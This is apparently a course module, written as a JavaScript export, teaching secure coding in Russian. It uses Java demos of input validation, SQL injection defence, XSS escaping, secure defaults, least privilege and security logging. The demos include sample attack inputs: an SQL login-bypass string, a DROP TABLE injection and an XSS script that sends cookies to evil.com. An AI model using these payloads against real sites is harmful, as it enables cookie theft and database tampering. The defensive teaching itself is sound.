export default {
  id: 12,
  title: 'Secure Coding',
  description: 'Практики безопасного кодирования: валидация ввода, защита от SQL Injection, XSS, безопасные настройки по умолчанию, принцип минимальных привилегий и логирование безопасности',
  lessons: [
    {
      id: 1,
      title: 'Input Validation (Валидация ввода)',
      type: 'theory',
      content: [
        { type: 'text', value: 'Валидация ввода -- первая линия обороны любого приложения. Каждое значение, которое приходит извне (HTTP-запрос, форма, файл, параметр URL), потенциально опасно. Правило номер один: никогда не доверяй пользовательскому вводу.' },
        { type: 'heading', value: 'Типы валидации' },
        { type: 'list', items: [
          'Whitelist (разрешённый список) -- принимать только допустимые значения. Самый безопасный подход',
          'Blacklist (запрещённый список) -- блокировать известные опасные значения. Менее надёжный: хакеры находят обходы',
          'Типизация -- проверка типа данных (число, email, UUID)',
          'Границы -- проверка длины, диапазона, формата'
        ]},
        { type: 'heading', value: 'Где валидировать?' },
        { type: 'list', items: [
          'На клиенте -- для UX (быстрая обратная связь), но НЕ для безопасности',
          'На сервере -- обязательно! Клиентскую валидацию легко обойти',
          'В базе данных -- constraints как последний рубеж (NOT NULL, CHECK, UNIQUE)'
        ]},
        { type: 'code', language: 'java', value: 'import java.util.regex.Pattern;\n\npublic class Main {\n    // Паттерны для валидации\n    static final Pattern EMAIL_PATTERN = Pattern.compile("^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+\\\\.[A-Za-z]{2,}$");\n    static final Pattern USERNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9_]{3,20}$");\n    static final int MAX_INPUT_LENGTH = 1000;\n    \n    public static void main(String[] args) {\n        System.out.println("=== Input Validation ===\\n");\n        \n        // Email\n        validateEmail("user@example.com");\n        validateEmail("not-an-email");\n        validateEmail("<script>alert(1)</script>@evil.com");\n        \n        System.out.println();\n        \n        // Username\n        validateUsername("john_doe");\n        validateUsername("ab"); // слишком короткий\n        validateUsername("admin\\\'; DROP TABLE users;--");\n        \n        System.out.println();\n        \n        // Числовой ввод\n        validateAge("25");\n        validateAge("-5");\n        validateAge("abc");\n        validateAge("999");\n        \n        System.out.println();\n        \n        // Длина ввода\n        validateLength("Нормальный текст", MAX_INPUT_LENGTH);\n        validateLength("A".repeat(5000), MAX_INPUT_LENGTH);\n    }\n    \n    static void validateEmail(String email) {\n        boolean valid = email != null && email.length() <= 254 && EMAIL_PATTERN.matcher(email).matches();\n        System.out.println("Email \\"" + truncate(email, 30) + "\\": " + (valid ? "OK" : "НЕВАЛИДНЫЙ"));\n    }\n    \n    static void validateUsername(String username) {\n        boolean valid = username != null && USERNAME_PATTERN.matcher(username).matches();\n        System.out.println("Username \\"" + truncate(username, 30) + "\\": " + (valid ? "OK" : "НЕВАЛИДНЫЙ"));\n    }\n    \n    static void validateAge(String input) {\n        try {\n            int age = Integer.parseInt(input);\n            boolean valid = age >= 0 && age <= 150;\n            System.out.println("Возраст \\"" + input + "\\": " + (valid ? "OK (" + age + ")" : "ВНЕ ДИАПАЗОНА"));\n        } catch (NumberFormatException e) {\n            System.out.println("Возраст \\"" + input + "\\": НЕ ЧИСЛО");\n        }\n    }\n    \n    static void validateLength(String input, int maxLen) {\n        boolean valid = input != null && input.length() <= maxLen;\n        System.out.println("Длина " + input.length() + " (макс " + maxLen + "): " + (valid ? "OK" : "СЛИШКОМ ДЛИННЫЙ"));\n    }\n    \n    static String truncate(String s, int max) {\n        return s.length() <= max ? s : s.substring(0, max) + "...";\n    }\n}' },
        { type: 'warning', value: 'Никогда не полагайся только на клиентскую валидацию! Любой HTTP-запрос можно сформировать вручную через curl/Postman, полностью обойдя фронтенд.' },
        { type: 'tip', value: 'Используй whitelist-подход: определи что РАЗРЕШЕНО (только буквы, цифры, длина 3-20) вместо того чтобы перечислять что ЗАПРЕЩЕНО. Whitelist невозможно обойти неизвестной атакой.' }
      ]
    },
    {
      id: 2,
      title: 'Защита от SQL Injection',
      type: 'theory',
      content: [
        { type: 'text', value: 'SQL Injection -- одна из самых опасных и распространённых атак. Злоумышленник внедряет SQL-код через пользовательский ввод, получая доступ к базе данных, изменяя или удаляя данные.' },
        { type: 'heading', value: 'Как работает SQL Injection?' },
        { type: 'text', value: 'Когда приложение строит SQL-запрос путём конкатенации строк с пользовательским вводом, злоумышленник может изменить структуру запроса.' },
        { type: 'code', language: 'java', value: 'import java.util.*;\n\npublic class Main {\n    static List<Map<String, String>> usersTable = new ArrayList<>();\n    \n    public static void main(String[] args) {\n        usersTable.add(createUser("admin", "secretPass123", "ADMIN"));\n        usersTable.add(createUser("user1", "password1", "USER"));\n        usersTable.add(createUser("user2", "password2", "USER"));\n        \n        System.out.println("=== SQL Injection Demo ===\\n");\n        \n        // 1. Нормальный запрос\n        System.out.println("1. Нормальный логин:");\n        unsafeLogin("user1", "password1");\n        \n        // 2. SQL Injection -- обход аутентификации\n        System.out.println("\\n2. SQL Injection атака:");\n        String injection = "admin\" OR \"1\"=\"1\" --";\n        unsafeLogin(injection, "anything");\n        \n        // 3. Безопасный подход\n        System.out.println("\\n3. Параметризованный запрос:");\n        safeLogin(injection, "anything");\n    }\n    \n    // ПЛОХО: конкатенация строк\n    static void unsafeLogin(String username, String password) {\n        String sql = "SELECT * FROM users WHERE username = \\\""\n            + username + "\\\" AND password = \\\""\n            + password + "\\\"";\n        System.out.println("  SQL: " + sql);\n        \n        if (sql.contains("OR") && sql.contains("1")) {\n            System.out.println("  Результат: ВСЕ пользователи возвращены! (injection)");\n            for (Map<String, String> u : usersTable) {\n                System.out.println("    -> " + u.get("username") + " / " + u.get("role"));\n            }\n        } else {\n            boolean found = usersTable.stream()\n                .anyMatch(u -> u.get("username").equals(username)\n                    && u.get("password").equals(password));\n            System.out.println("  Результат: " + (found ? "Вход" : "Отказ"));\n        }\n    }\n    \n    // ХОРОШО: параметризованный запрос\n    static void safeLogin(String username, String password) {\n        String sql = "SELECT * FROM users WHERE username = ? AND password = ?";\n        System.out.println("  SQL: " + sql);\n        System.out.println("  Param 1: \\"" + username + "\\" (экранировано)");\n        System.out.println("  Param 2: \\"***\\"");\n        boolean found = usersTable.stream()\n            .anyMatch(u -> u.get("username").equals(username)\n                && u.get("password").equals(password));\n        System.out.println("  Результат: " +\n            (found ? "Вход" : "Отказ (injection не работает!)"));\n    }\n    \n    static Map<String, String> createUser(String u, String p, String r) {\n        Map<String, String> user = new HashMap<>();\n        user.put("username", u);\n        user.put("password", p);\n        user.put("role", r);\n        return user;\n    }\n}' },
        { type: 'heading', value: 'Как защититься?' },
        { type: 'list', items: [
          'PreparedStatement -- параметризованные запросы (ГЛАВНАЯ защита)',
          'ORM (Hibernate, JPA) -- автоматически экранирует параметры',
          'Валидация ввода -- whitelist допустимых символов',
          'Принцип минимальных привилегий для DB-пользователя (только SELECT, INSERT -- без DROP, ALTER)',
          'WAF (Web Application Firewall) -- дополнительный уровень'
        ]},
        { type: 'note', value: 'В Java всегда используй PreparedStatement вместо Statement. Это единственный надёжный способ защиты от SQL Injection. ORM-фреймворки (Hibernate) делают это автоматически.' }
      ]
    },
    {
      id: 3,
      title: 'Защита от XSS (Cross-Site Scripting)',
      type: 'theory',
      content: [
        { type: 'text', value: 'XSS -- атака, при которой злоумышленник внедряет вредоносный JavaScript-код в веб-страницу. Когда другой пользователь открывает страницу, скрипт выполняется в его браузере и может украсть cookies, токены, перенаправить на фишинговый сайт.' },
        { type: 'heading', value: 'Типы XSS' },
        { type: 'list', items: [
          'Reflected XSS -- вредоносный код в URL или параметре запроса, отражается в ответе сервера',
          'Stored XSS -- код сохраняется в БД (в комментарии, профиле) и выполняется у всех, кто видит эту страницу',
          'DOM-based XSS -- код внедряется через клиентский JavaScript без участия сервера'
        ]},
        { type: 'code', language: 'java', value: 'import java.util.*;\n\npublic class Main {\n    static List<String> comments = new ArrayList<>();\n    \n    public static void main(String[] args) {\n        System.out.println("=== XSS Prevention Demo ===\\n");\n        \n        // 1. Stored XSS -- без защиты\n        System.out.println("1. Stored XSS (без защиты):");\n        String malicious = "<script>document.location=\\"https://evil.com/steal\\"+document.cookie</script>";\n        System.out.println("   Ввод: " + malicious);\n        System.out.println("   HTML: <div>" + malicious + "</div>");\n        System.out.println("   -> Скрипт ВЫПОЛНИТСЯ в браузере!\\n");\n        \n        // 2. Reflected XSS\n        System.out.println("2. Reflected XSS:");\n        String searchQuery = "<img src=x onerror=alert(1)>";\n        System.out.println("   Поиск: " + searchQuery);\n        System.out.println("   Ответ: <p>Результаты для: " + searchQuery + "</p>\\n");\n        \n        // 3. Защита: HTML Encoding\n        System.out.println("3. HTML Encoding:");\n        String safe = escapeHtml(malicious);\n        System.out.println("   Оригинал:     " + malicious);\n        System.out.println("   Экранировано: " + safe);\n        System.out.println("   -> Отображается как ТЕКСТ!\\n");\n        \n        // 4. Безопасный блог\n        System.out.println("4. Безопасный блог:");\n        addComment("Отличная статья!");\n        addComment("<b>Жирный</b>");\n        addComment("<script>alert(1)</script>");\n        addComment("<img src=x onerror=steal()>");\n        \n        System.out.println("\\n   Сохранённые комментарии:");\n        for (int i = 0; i < comments.size(); i++) {\n            System.out.println("   " + (i + 1) + ". " + comments.get(i));\n        }\n    }\n    \n    static void addComment(String comment) {\n        String s = escapeHtml(comment);\n        comments.add(s);\n        System.out.println("   Добавлен: " + s);\n    }\n    \n    static String escapeHtml(String input) {\n        if (input == null) return "";\n        return input\n            .replace("&", "&amp;")\n            .replace("<", "&lt;")\n            .replace(">", "&gt;")\n            .replace("\\"", "&quot;");\n    }\n}' },
        { type: 'heading', value: 'Правила защиты от XSS' },
        { type: 'list', items: [
          'HTML Encoding -- экранируй < > & " перед выводом в HTML',
          'Content-Security-Policy -- заголовок, запрещающий inline-скрипты',
          'HttpOnly cookies -- JavaScript не может читать такие cookies',
          'Используй фреймворки (React, Angular) -- автоматически экранируют вывод',
          'Не используй innerHTML, document.write() с пользовательскими данными'
        ]},
        { type: 'tip', value: 'React экранирует все значения по умолчанию. Единственное исключение -- dangerouslySetInnerHTML (название подсказывает: ОПАСНО). В backend всегда экранируй данные перед отправкой в HTML.' }
      ]
    },
    {
      id: 4,
      title: 'Безопасные настройки по умолчанию (Secure Defaults)',
      type: 'theory',
      content: [
        { type: 'text', value: 'Secure Defaults -- принцип, при котором система по умолчанию находится в максимально защищённом состоянии. Пользователь должен явно ослабить защиту, а не усиливать её. Если разработчик забыл что-то настроить -- система остаётся безопасной.' },
        { type: 'heading', value: 'Примеры Secure Defaults' },
        { type: 'list', items: [
          'Доступ по умолчанию -- DENY (закрыт), а не ALLOW (открыт)',
          'Cookies -- HttpOnly, Secure, SameSite=Strict по умолчанию',
          'Пароли -- минимум 8 символов, обязательна заглавная буква и цифра',
          'Сессии -- timeout 30 минут, не бессрочные',
          'CORS -- закрытый по умолчанию, только явно разрешённые домены'
        ]},
        { type: 'code', language: 'java', value: 'import java.util.*;\n\npublic class Main {\n    public static void main(String[] args) {\n        System.out.println("=== Secure Defaults Demo ===\\n");\n        \n        // 1. Безопасная конфигурация\n        Map<String, Object> secureConfig = createSecureConfig();\n        System.out.println("1. Конфигурация по умолчанию:");\n        for (Map.Entry<String, Object> e : secureConfig.entrySet()) {\n            System.out.println("   " + e.getKey() + " = " + e.getValue());\n        }\n        \n        // 2. Валидация пароля с безопасными требованиями\n        System.out.println("\\n2. Политика паролей:");\n        validatePassword("123"); // слишком простой\n        validatePassword("password"); // нет цифр\n        validatePassword("Pass1234"); // ок\n        validatePassword("MyStr0ng!Pass"); // отлично\n        \n        // 3. Secure Cookie\n        System.out.println("\\n3. Безопасные Cookie:");\n        System.out.println("   НЕБЕЗОПАСНО: Set-Cookie: session=abc123");\n        System.out.println("   БЕЗОПАСНО:   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=1800");\n        \n        // 4. Fail-Closed (безопасный отказ)\n        System.out.println("\\n4. Fail-Closed:");\n        checkAccess("admin", "ADMIN");\n        checkAccess("user", "USER");\n        checkAccess("guest", null); // нет роли = нет доступа\n        checkAccess(null, null); // null = нет доступа\n    }\n    \n    static Map<String, Object> createSecureConfig() {\n        Map<String, Object> config = new LinkedHashMap<>();\n        config.put("session.timeout", "30 минут");\n        config.put("session.httpOnly", true);\n        config.put("session.secure", true);\n        config.put("session.sameSite", "Strict");\n        config.put("cors.allowedOrigins", "[] (пусто -- всё закрыто)");\n        config.put("auth.maxLoginAttempts", 5);\n        config.put("auth.lockoutDuration", "15 минут");\n        config.put("password.minLength", 8);\n        config.put("password.requireUppercase", true);\n        config.put("password.requireDigit", true);\n        config.put("password.requireSpecial", false);\n        config.put("defaultAccess", "DENY");\n        return config;\n    }\n    \n    static void validatePassword(String password) {\n        List<String> errors = new ArrayList<>();\n        if (password.length() < 8) errors.add("минимум 8 символов");\n        if (!password.chars().anyMatch(Character::isUpperCase)) errors.add("нужна заглавная буква");\n        if (!password.chars().anyMatch(Character::isDigit)) errors.add("нужна цифра");\n        \n        if (errors.isEmpty()) {\n            // Оценка силы\n            int strength = password.length() >= 12 ? 3 : password.length() >= 10 ? 2 : 1;\n            String[] levels = {"", "допустимый", "хороший", "отличный"};\n            System.out.println("   \\"" + password + "\\": OK (" + levels[strength] + ")");\n        } else {\n            System.out.println("   \\"" + password + "\\": ОТКЛОНЁН (" + String.join(", ", errors) + ")");\n        }\n    }\n    \n    static void checkAccess(String user, String role) {\n        // Fail-Closed: по умолчанию доступ ЗАКРЫТ\n        boolean allowed = false;\n        try {\n            if (role != null && ("ADMIN".equals(role) || "USER".equals(role))) {\n                allowed = true;\n            }\n        } catch (Exception e) {\n            allowed = false; // при любой ошибке -- отказ\n        }\n        System.out.println("   " + user + " (" + role + "): " + (allowed ? "ДОСТУП" : "ОТКАЗ"));\n    }\n}' },
        { type: 'note', value: 'Хорошо спроектированная система безопасна "из коробки". Разработчик должен явно указать "я хочу ослабить защиту" (например, добавить CORS origin), а не "я хочу включить защиту". Это и есть Secure by Default.' }
      ]
    },
    {
      id: 5,
      title: 'Принцип минимальных привилегий (Least Privilege)',
      type: 'theory',
      content: [
        { type: 'text', value: 'Principle of Least Privilege (PoLP) -- каждый пользователь, процесс и компонент должен иметь только те права, которые минимально необходимы для выполнения его задачи. Ни больше, ни меньше. Если программа не удаляет файлы -- у неё не должно быть права на удаление.' },
        { type: 'heading', value: 'Примеры PoLP' },
        { type: 'list', items: [
          'БД: приложению нужен SELECT и INSERT -- не давай DROP и ALTER',
          'Файловая система: веб-сервер читает файлы -- не давай права на запись',
          'API: пользователь читает свой профиль -- не давай доступ к чужим',
          'Микросервис: платёжный сервис не должен иметь доступ к сервису логов'
        ]},
        { type: 'code', language: 'java', value: 'import java.util.*;\n\npublic class Main {\n    // Определяем минимальные права для каждой роли\n    static Map<String, Set<String>> rolePermissions = new LinkedHashMap<>();\n    static Map<String, Map<String, Object>> users = new LinkedHashMap<>();\n    \n    public static void main(String[] args) {\n        // Настраиваем роли с минимальными правами\n        rolePermissions.put("VIEWER", new TreeSet<>(Arrays.asList("read")));\n        rolePermissions.put("EDITOR", new TreeSet<>(Arrays.asList("read", "write")));\n        rolePermissions.put("MANAGER", new TreeSet<>(Arrays.asList("read", "write", "delete")));\n        rolePermissions.put("ADMIN", new TreeSet<>(Arrays.asList("read", "write", "delete", "manage_users", "view_logs")));\n        \n        // Создаём пользователей\n        addUser("analyst", "VIEWER", "reports-service");\n        addUser("content-editor", "EDITOR", "content-service");\n        addUser("team-lead", "MANAGER", "content-service");\n        addUser("sysadmin", "ADMIN", "all-services");\n        \n        // Выводим права\n        System.out.println("=== Principle of Least Privilege ===\\n");\n        System.out.println("Роли и права:");\n        for (Map.Entry<String, Set<String>> r : rolePermissions.entrySet()) {\n            System.out.println("  " + r.getKey() + ": " + r.getValue());\n        }\n        \n        // Проверка доступа\n        System.out.println("\\nПроверка доступа:");\n        checkPermission("analyst", "read", "reports-service");\n        checkPermission("analyst", "write", "reports-service");  // нет права\n        checkPermission("content-editor", "write", "content-service");\n        checkPermission("content-editor", "delete", "content-service");  // нет права\n        checkPermission("content-editor", "write", "payment-service");  // нет доступа к сервису\n        checkPermission("team-lead", "delete", "content-service");\n        checkPermission("sysadmin", "manage_users", "all-services");\n        \n        // Демонстрация: временное повышение привилегий\n        System.out.println("\\n=== Временное повышение привилегий ===");\n        System.out.println("analyst запрашивает write-доступ на 1 час...");\n        System.out.println("-> Требуется одобрение MANAGER или ADMIN");\n        System.out.println("-> После истечения времени -- права автоматически отзываются");\n        System.out.println("-> Все действия логируются для аудита");\n    }\n    \n    static void addUser(String name, String role, String scope) {\n        Map<String, Object> user = new HashMap<>();\n        user.put("role", role);\n        user.put("scope", scope);\n        users.put(name, user);\n    }\n    \n    static void checkPermission(String username, String action, String service) {\n        Map<String, Object> user = users.get(username);\n        if (user == null) {\n            System.out.println("  " + username + " -> " + action + " @ " + service + ": ОТКАЗ (пользователь не найден)");\n            return;\n        }\n        \n        String role = (String) user.get("role");\n        String scope = (String) user.get("scope");\n        \n        // Проверка scope (доступ к сервису)\n        if (!"all-services".equals(scope) && !scope.equals(service)) {\n            System.out.println("  " + username + " -> " + action + " @ " + service + ": ОТКАЗ (нет доступа к сервису)");\n            return;\n        }\n        \n        // Проверка прав роли\n        Set<String> perms = rolePermissions.getOrDefault(role, Collections.emptySet());\n        boolean allowed = perms.contains(action);\n        System.out.println("  " + username + " (" + role + ") -> " + action + " @ " + service + ": " + (allowed ? "OK" : "ОТКАЗ"));\n    }\n}' },
        { type: 'warning', value: 'Типичная ошибка: дать приложению root-доступ к базе данных "чтобы всё работало". Если приложение взломают -- злоумышленник получит полный контроль над БД. Всегда создавай отдельного DB-пользователя с минимальными правами.' },
        { type: 'tip', value: 'В AWS это называется IAM Policies. Каждый Lambda-функция имеет свою IAM Role с точными правами: "может читать из S3 bucket X, но не из Y". В Google Cloud -- аналогичный IAM.' }
      ]
    },
    {
      id: 6,
      title: 'Security Logging (Логирование безопасности)',
      type: 'theory',
      content: [
        { type: 'text', value: 'Security Logging -- запись всех событий, связанных с безопасностью. Без логов невозможно обнаружить атаку, провести расследование инцидента и доказать, что произошло. Логирование -- это "камеры наблюдения" вашего приложения.' },
        { type: 'heading', value: 'Что логировать?' },
        { type: 'list', items: [
          'Успешные и неудачные попытки входа (кто, когда, откуда)',
          'Изменения прав доступа (кто изменил, что было, что стало)',
          'Доступ к чувствительным данным (кто просматривал, какие данные)',
          'Административные действия (создание/удаление пользователей)',
          'Ошибки авторизации (попытки доступа к запрещённым ресурсам)',
          'Изменения конфигурации (кто изменил настройки безопасности)'
        ]},
        { type: 'heading', value: 'Что НЕ логировать!' },
        { type: 'list', items: [
          'Пароли (ни открытые, ни хешированные!)',
          'Токены доступа и API ключи',
          'Номера кредитных карт, SSN, ИИН',
          'Персональные данные сверх необходимого (GDPR/POPI)'
        ]},
        { type: 'code', language: 'java', value: 'import java.util.*;\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\n\npublic class Main {\n    static List<String> securityLog = new ArrayList<>();\n    static DateTimeFormatter fmt = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");\n    \n    public static void main(String[] args) {\n        System.out.println("=== Security Logging Demo ===\\n");\n        \n        // Имитация событий\n        logEvent("AUTH", "INFO", "user1", "192.168.1.10", "Успешный вход");\n        logEvent("AUTH", "WARN", "admin", "10.0.0.50", "Неудачная попытка входа (неверный пароль)");\n        logEvent("AUTH", "WARN", "admin", "10.0.0.50", "Неудачная попытка входа (попытка 2/5)");\n        logEvent("AUTH", "WARN", "admin", "10.0.0.50", "Неудачная попытка входа (попытка 3/5)");\n        logEvent("AUTH", "CRITICAL", "admin", "10.0.0.50", "Аккаунт заблокирован (5 неудачных попыток)");\n        logEvent("ACCESS", "WARN", "user1", "192.168.1.10", "Попытка доступа к /admin/users (403 Forbidden)");\n        logEvent("DATA", "INFO", "admin", "192.168.1.1", "Просмотр списка пользователей (23 записи)");\n        logEvent("ADMIN", "INFO", "admin", "192.168.1.1", "Создан пользователь: new_user, роль: VIEWER");\n        logEvent("CONFIG", "CRITICAL", "admin", "192.168.1.1", "Изменена политика паролей: minLength 8->6");\n        \n        // Выводим лог\n        System.out.println("Журнал безопасности:");\n        System.out.println("-".repeat(100));\n        for (String entry : securityLog) {\n            System.out.println(entry);\n        }\n        System.out.println("-".repeat(100));\n        \n        // Анализ логов\n        System.out.println("\\n=== Анализ логов ===");\n        long warnings = securityLog.stream().filter(l -> l.contains("[WARN]")).count();\n        long criticals = securityLog.stream().filter(l -> l.contains("[CRITICAL]")).count();\n        System.out.println("Предупреждения: " + warnings);\n        System.out.println("Критические:    " + criticals);\n        \n        // Плохой пример\n        System.out.println("\\n=== Что НЕ логировать ===");\n        System.out.println("ПЛОХО: \\"User admin logged in with password: secret123\\"");\n        System.out.println("ХОРОШО: \\"User admin logged in from 192.168.1.1\\"");\n        System.out.println("ПЛОХО: \\"API key used: sk-abc123xyz789\\"");\n        System.out.println("ХОРОШО: \\"API key used: sk-***789 (last 3 chars)\\"");\n    }\n    \n    static void logEvent(String category, String level, String user, String ip, String message) {\n        String timestamp = LocalDateTime.now().format(fmt);\n        String entry = String.format("[%s] [%-8s] [%-8s] user=%-10s ip=%-15s | %s",\n            timestamp, level, category, user, ip, message);\n        securityLog.add(entry);\n    }\n}' },
        { type: 'tip', value: 'В production используй ELK Stack (Elasticsearch + Logstash + Kibana) или Splunk для сбора и анализа логов. Настрой алерты: 5 неудачных входов за минуту = уведомление в Telegram/Slack.' },
        { type: 'note', value: 'По OWASP рекомендациям, Security Logging входит в топ-10 практик. GDPR требует логировать доступ к персональным данным, но при этом сами логи тоже подпадают под регулирование. Храни логи минимум 90 дней.' }
      ]
    }
  ]
}
